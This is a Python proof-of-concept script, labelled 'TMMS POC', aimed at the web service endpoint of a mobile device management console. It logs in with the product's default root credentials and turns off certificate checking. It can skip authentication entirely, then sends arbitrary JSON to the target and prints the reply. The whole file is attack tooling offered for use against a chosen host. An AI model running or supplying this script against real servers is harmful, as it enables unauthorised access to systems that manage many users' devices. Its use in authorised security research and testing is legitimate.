import sys, argparse, requests 
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
descr = 'TMMS POC'
parser = argparse.ArgumentParser(description=descr, formatter_class=argparse.RawTextHelpFormatter)
required = parser.add_argument_group('required arguments')
required.add_argument('-t', '--target',required=True, help='Target host')
required.add_argument('-d', '--data',required=True, help='POST data in JSON format')
parser.add_argument('-U', '--user', default='root', help='User account to login, default: %(default)s')
parser.add_argument('-P', '--password', default='mobilesecurity', help='User password, default: %(default)s')
parser.add_argument('-p', '--port', type=int, default=443, help='TMMS web console port, default: %(default)s')
parser.add_argument('-s', '--noauth', action='store_true', help='Skip authentication')
args = parser.parse_args()
host = args.target
port = args.port
user = args.user
data = args.data
password = args.password
noauth = args.noauth
s = requests.Session()
url = 'https://{}:{}/mdm/cgi/web_service.dll'.format(host, port)
tmms_tok = None
# Login
if not noauth:
  print('Logging in as {} / {}'.format(user, password))
  payload = {
    'tmms_action': 'login',
    'data'       : {'username': user, 'password': password} 
  }
  r = s.post(url, json=payload, verify=False)
  if 'Success' not in r.text:
    sys.exit('Login failed.')
  tmms_tok = r.cookies['TMMStoken']
if tmms_tok is not None:
  headers = {'Content-Type':'application/json', 'x-tmmstoken': tmms_tok}
else:
  headers = {'Content-Type':'application/json'}
r = s.post(url, data=data, headers = headers, verify=False)
print('req:\n')
print(r.request.body)
print('\nresp:')
print(r.text)
